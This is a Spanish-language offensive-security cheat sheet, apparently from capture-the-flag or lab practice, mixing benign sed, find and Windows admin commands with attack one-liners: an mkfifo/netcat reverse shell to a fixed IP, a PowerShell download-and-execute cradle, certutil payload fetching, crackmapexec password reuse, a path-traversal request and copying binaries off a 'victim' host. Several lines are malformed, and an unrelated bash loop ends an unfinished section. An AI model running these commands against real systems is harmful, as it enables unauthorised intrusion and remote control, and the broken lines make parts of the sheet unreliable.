## Expresion regulares 
**Expresion regular para añadir texto antes de cada oracion:** ``sed -E 's/^(.*)/Texto a añadir \1/g;s/\r//'``
**Expresion regular para eliminar espacios en blanco de un texto:** `'/^\s*$/d'`
## Linux
**Reverse Shell; MKFIFO**: `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1| nc 10.10.14.5 443 >/tmp/f;*`
**Reutilizar contraseña para todos los usuarios en el sistema con CME(crackmapexec)**: `-u users -p '<password>' --continue-on-success`
**Ejecutar comandos desde consola interactiva de Python3 y ver el output**:`print(os.popen(""$command")).read())
**Mandar binarios de maquina victima a maquina atacando con SSH**: `sshpass -p '$passwd' scp $user@$ip:/path/to/binary .`
**Conseguir la fecha, hora, segundo y año(linux):** `date +%F_%H:%M:%S `
**Listar PID de procesos activos:** `"http://10.10.11.201:8000/?page=../../../../proc/$i/cmdline" -o -`
**Buscar por archivos con palabra determinada:** `find -name \*config\* 2>/dev/null | xargs cat`
## Windows
**Tirar de la ruta nativa de powershell en caso de obtener acceso denegado**: `C:\Windows\SysNative\WindowsPowerShell\v1.0\powershell` o  `C:\Windows\SysWow64\WindowsPowerShell\v1.0\powershell`
**Vaciar el contenido de un archivo con cmd**: `<cmd /c> "copy /y NUL clean.bat"`
**Descargar e intrepretar archivo powershell(invoke)**: `<powershell> IEX(New-Object Net.WebClient).downloadString('http://<ip>/<PsScript>')` 
**Descargar archivos con certutil**: `certutil.exe -f -urlcache -split http://<ip>/<file> <name>`
**Para listar drivers existentes**: `driverquery`
**Filtrar por las flags en maquinas windows**: `cmd /c dir /r /s $flag.txt`
**Convertir un archivo a b64 con certutil para su posterior decode**: `certutil.exe -encode root.exe root.exe.b64`
**Para saber la version de windows:** `reg query "hklm\software\microsfot\windows nt\currentversion" /v ProductName`
**Listar contenido oculto:** `dir -Force`
**Listar reglas de firewall:** `netsh advfirewall show currentprofile`
**Listar permisos de un archivo:** `icacls archivo`
## Grupos y los privilegios que tienen(linux)
**Privilegios:**
1. **ADM**. Permite leer logs.
i=1; for folder in $(ls -d */); do mv "$folder" "$i.$folder"; i=$((i+1)); if [ $i -gt 10 ]; then break; fi; done

